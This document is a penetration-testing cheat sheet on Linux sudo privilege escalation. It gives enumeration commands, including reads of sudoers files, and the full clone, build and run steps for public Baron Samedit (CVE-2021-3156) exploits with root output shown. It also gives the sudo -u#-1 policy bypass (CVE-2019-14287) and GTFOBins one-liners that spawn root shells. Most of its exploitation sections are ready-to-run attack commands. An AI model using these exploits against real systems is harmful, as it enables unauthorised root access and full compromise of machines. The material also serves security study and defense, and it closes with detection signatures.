## Sudo Privilege Escalation

Sudo is the most audited privilege mechanism on Linux, but it has had critical vulnerabilities that allowed full root access without any sudo permissions being granted. The two most exploitable ones from a pen testing standpoint are CVE-2021-3156 and CVE-2019-14287. 

***

## Enumeration

```bash
# Check sudo version (primary filter for both CVEs)
sudo -V | head -n1

# Check what commands your user can run with sudo
sudo -l

# Read sudoers directly (requires permission, but worth trying)
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
cat /etc/sudoers.d/*

# Check OS version (needed to match the right exploit target)
cat /etc/lsb-release
cat /etc/os-release
```

***

## CVE-2021-3156: Baron Samedit

Baron Samedit is a heap-based buffer overflow in sudo's command-line argument parsing logic, specifically in how it processes backslash characters.  It does not require the attacker to have any sudo permissions at all. Any local user on a vulnerable system can exploit it to gain root instantly. 

### Affected Versions

| Distribution | Sudo Version |
|---|---|
| Ubuntu 20.04 (Focal) | 1.8.31 |
| Ubuntu 18.04 (Bionic) | 1.8.21 |
| Debian 10 (Buster) | 1.8.27 |
| Fedora 33 | 1.9.2 |

All versions before `1.9.5p2` are affected. 

### Quick Check Without Running an Exploit

```bash
# Safe test: if the command throws a "usage" error, the system is patched
# If it hangs or shows a different error, it may be vulnerable
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# Patched: "usage: sudoedit ..."
# Vulnerable: segfault or malloc error
```

### Exploitation with blasty's PoC

```bash
# Clone and compile on target (if internet accessible) or transfer binary
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
# Produces: sudo-hax-me-a-sandwich

# List available targets
./sudo-hax-me-a-sandwich

# Match the target ID to the OS version found earlier
# Ubuntu 20.04 = target 1
./sudo-hax-me-a-sandwich 1

# uid=0(root) gid=0(root) groups=0(root)
```

If the target has no internet access, compile on a matching system and transfer the binary via your preferred file transfer method. 

### Alternative PoC (Python-based, no compilation needed)

```bash
# Qualys published a Python PoC that works differently
# CVE-2021-3156 Python exploit by r4j0x00
git clone https://github.com/r4j0x00/exploits
cd exploits/CVE-2021-3156_one_shot
python3 exploit.py
```

***

## CVE-2019-14287: Sudo Policy Bypass

This is a logic flaw rather than a memory corruption bug. When sudo is given a UID of `-1` using the `-u#` flag, it interprets it as UID `0` (root) because the `getpwuid()` function returns NULL for `-1` and sudo falls back to executing as UID `0`. 

### Affected Versions

All sudo versions below `1.8.28`. 
### Required Condition

Your sudoers entry must specify `ALL` or `(ALL)` as the Runas specifier. If the entry explicitly names only `root`, the bypass does not work because the policy is checked before the UID handling bug fires. 

```
# Vulnerable configuration - Runas is ALL
cry0l1t3  ALL=(ALL) /usr/bin/id

# Also vulnerable - wildcard with any command
cry0l1t3  ALL=(ALL) NOPASSWD: /usr/bin/vim

# NOT vulnerable - Runas limited to root only
cry0l1t3  ALL=(root) /usr/bin/id
```

### Exploitation

```bash
# The core trick: -u#-1 is treated as UID 0
sudo -u#-1 id
# uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)

# Alternative - use the unsigned equivalent of -1
sudo -u#4294967295 id
# uid=0(root)

# Practical use: run bash instead of id
sudo -u#-1 /bin/bash
# root shell, with the command you are allowed to run swapped

# If the sudoers entry allows a specific binary like vim
sudo -u#-1 /usr/bin/vim -c ':!/bin/bash'

# If it allows python
sudo -u#-1 /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

***

## General Sudo Misconfigurations

Beyond CVEs, the `sudo -l` output itself often reveals direct escalation paths through GTFOBins: 

```bash
# Always check GTFOBins for every binary listed in sudo -l
# https://gtfobins.github.io/

# Common examples:
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd  # then type: !/bin/bash
sudo man man           # then type: !/bin/bash
sudo env /bin/bash
sudo /bin/bash         # if directly listed
```

***

## CVE Comparison

| | CVE-2021-3156 (Baron Samedit) | CVE-2019-14287 |
|---|---|---|
| Type | Heap-based buffer overflow | Security policy bypass |
| Requires sudo permissions | No, any local user | Yes, must have some sudo entry |
| Sudo versions affected | Before 1.9.5p2 | Before 1.8.28 |
| Requires compilation | Yes (C exploit) | No (just a flag) |
| Reliability | High, multiple PoCs exist | Very high, single command |
| Detection signature | Abnormal sudoedit argument parsing | `sudo -u#-1` in logs  
